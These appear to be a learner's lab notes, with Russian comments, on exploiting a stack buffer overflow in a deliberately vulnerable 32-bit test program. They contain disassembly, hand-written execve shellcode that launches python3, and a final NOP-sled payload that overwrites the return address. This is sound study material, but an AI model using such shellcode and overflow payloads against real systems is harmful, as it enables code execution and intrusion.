
 gcc -g -m32 -fno-stack-protector \
-z execstack vuln_stack.c -o vuln_stack

```bash
 ./vuln_stack e
addr ␣ buf: ␣ 0xffffc20c 
addr ␣ &v: ␣ 0xffffc280 
buf: ␣ e 
```

0xffffc280 - 0xffffc20c = 116


```bash
 objdump -d -M intel vuln_stack | grep -A 10 '<foo
'
000011ad <foo>:
    11ad:       55                      push   ebp
    11ae:       89 e5                   mov    ebp,esp
    11b0:       53                      push   ebx
    11b1:       83 ec 74                sub    esp,0x74
    11b4:       e8 f7 fe ff ff          call   10b0 <__x86.get_pc_thunk.bx>
    11b9:       81 c3 17 2e 00 00       add    ebx,0x2e17
    11bf:       83 ec 08                sub    esp,0x8
    11c2:       8d 45 94                lea    eax,[ebp-0x6c]
    11c5:       50                      push   eax
    11c6:       8d 83 38 e0 ff ff       lea    eax,[ebx-0x1fc8]
--
    1253:       e8 55 ff ff ff          call   11ad <foo>
    1258:       83 c4 10                add    esp,0x10
    125b:       b8 00 00 00 00          mov    eax,0x0
    1260:       8d 65 f8                lea    esp,[ebp-0x8]
    1263:       59                      pop    ecx
    1264:       5b                      pop    ebx
    1265:       5d                      pop    ebp
    1266:       8d 61 fc                lea    esp,[ecx-0x4]
    1269:       c3                      ret

Disassembly of section .fini:
```

0x6c = 108 байт -- размер массива в стеке 
0xffffc20c -- адрес массива в стеке


```bash
gcc -m32 -g --static execve_py.c -o execve_py

Reading symbols from ./execve_py...
(gdb) set disassembly-flavor intel
(gdb) disassemble execve
Dump of assembler code for function execve:
   0x080540b0 <+0>:     push   ebx
   0x080540b1 <+1>:     mov    edx,DWORD PTR [esp+0x10]
   0x080540b5 <+5>:     mov    ecx,DWORD PTR [esp+0xc]
   0x080540b9 <+9>:     mov    ebx,DWORD PTR [esp+0x8]
   0x080540bd <+13>:    mov    eax,0xb
   0x080540c2 <+18>:    call   DWORD PTR gs:0x10
   0x080540c9 <+25>:    pop    ebx
   0x080540ca <+26>:    cmp    eax,0xfffff001
   0x080540cf <+31>:    jae    0x8058630 <__syscall_error>
   0x080540d5 <+37>:    ret
End of assembler dump.
```
0xb - код системной функции execve.


```bash
python3 -c 'print(" ".join(["{:02x}".format(ord(c))
for c in "/usr/bin/python3"]))'
2f 75 73 72 2f 62 69 6e 2f 70 79 74 68 6f 6e 33
```

Создал файл pycode.asm

```bash
objdump -M intel -d pycode

pycode:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:       31 c0                   xor    eax,eax
 8049002:       50                      push   eax
 8049003:       68 68 6f 6e 33          push   0x336e6f68
 8049008:       68 2f 70 79 74          push   0x7479702f
 804900d:       68 2f 62 69 6e          push   0x6e69622f
 8049012:       89 e3                   mov    ebx,esp
 8049014:       89 c1                   mov    ecx,eax
 8049016:       89 c2                   mov    edx,eax
 8049018:       b0 0b                   mov    al,0xb
 804901a:       cd 80                   int    0x80
 ```

Создал pycode_test.c

```bash
gcc -z execstack -fno-stack-protector -m32 pycode_test.c -o pycode_test
```

```bash
$ ./pycode_test 
Python 3.12.3 (main, Jan 22 2026, 20:57:42) [GCC 13.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 
```

Шо получилось:
```bash
 ./vuln_stack "$(python3 -c '
import sys
sc = b"\x31\xc0\x50\x68\x68\x6f\x6e\x33\x68\x2f\x70\x79\x74\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
payload = b"\x90"*40 + sc + b"A"*(112 - 40 - len(sc)) + b"\xb0\xc1\xff\xff"
sys.stdout.buffer.write(payload)
')"
```
